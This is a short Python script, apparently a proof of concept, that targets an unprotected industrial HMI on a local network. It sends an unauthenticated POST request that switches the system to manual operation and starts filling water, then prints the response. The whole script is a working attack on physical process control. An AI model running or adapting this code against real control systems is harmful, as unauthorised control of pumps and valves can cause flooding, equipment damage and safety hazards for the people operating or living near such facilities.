import requests

print("Warning HMI is Unprotected")
print("Setting to Manual Operation and filling up water!")
url = 'http://192.168.8.225/manual?m=1&p=1'

response = requests.post(url)
print(response.status_code)
print(response.text)
